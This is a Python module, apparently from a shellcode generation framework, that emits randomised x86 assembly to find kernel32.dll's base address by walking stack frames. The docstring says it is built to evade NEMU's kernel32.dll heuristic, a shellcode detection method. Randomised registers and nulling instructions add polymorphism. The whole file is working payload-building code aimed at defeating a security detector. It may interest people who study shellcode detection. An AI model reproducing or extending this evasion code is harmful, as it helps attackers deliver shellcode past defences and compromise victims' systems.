#!/usr/bin/python

"""
Stackframe-walking based kernel32.dll base address resolution evading NEMU's kernel32.dll heuristic
"""

from random import choice

from payload_modules.kernel32.kernel32_base_resolution import kernel32_base_resolution
from arch.core import word_keywords, stackframepointer_registers, acc_regs, ctr_regs, src_index_regs, arch_registers, word_loads

class payload_kernel32_stackframe_walker(kernel32_base_resolution):

	def base_resolution_stub(self, base_reg):
		stackframepointer_reg = stackframepointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		src_index_reg = src_index_regs[self.bits]

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		regs = arch_registers(self.arch, self.bits)
		reg1 = regs.random_gp_reg(False, [src_index_reg])
		reg1_16 = regs.gp_reg_to_size(reg1, self.bits, 16)
		reg2 = regs.random_gp_reg(False, [reg1, acc_reg, src_index_reg])

		word_load = word_loads[self.bits]

		variables = {'src_index_reg': src_index_reg, 'base_reg': base_reg, 'word_load': word_load, 'acc_reg': acc_reg, 'stackframepointer_reg': stackframepointer_reg, 'word_keyword': word_keyword, 'null_instr': null_instr, 'reg1': reg1, 'reg1_16': reg1_16, 'reg2': reg2}

  		listing = '''
  	PUSH {reg1}
	PUSH {src_index_reg}
	PUSH {reg2}

	MOV {acc_reg}, {stackframepointer_reg}
stack_walking:
	MOV {src_index_reg}, {acc_reg}
	{word_load}
	MOV {reg2}, {word_keyword} PTR [{acc_reg}]
	TEST {reg2}, {reg2}
JNZ stack_walking

	; {src_index_reg} now points to last stack frame (and since {word_load} increments {src_index_reg} by 4
	; it points to function in either kernel32.dll or ntdll.dll depending on windows version)

	MOV {reg1}, {word_keyword} PTR [{src_index_reg}]

find_begin:
	DEC {reg1}
	; iterate through image until we find base address
	{null_instr} {reg1_16}, {reg1_16}
	; MZ start of PE header
	CMP WORD PTR [{reg1}], 0x5A4D
JNZ find_begin
	POP {reg2}
	POP {src_index_reg}

	MOV {base_reg}, {reg1}

	POP {reg1}
'''

		return listing.format(**variables)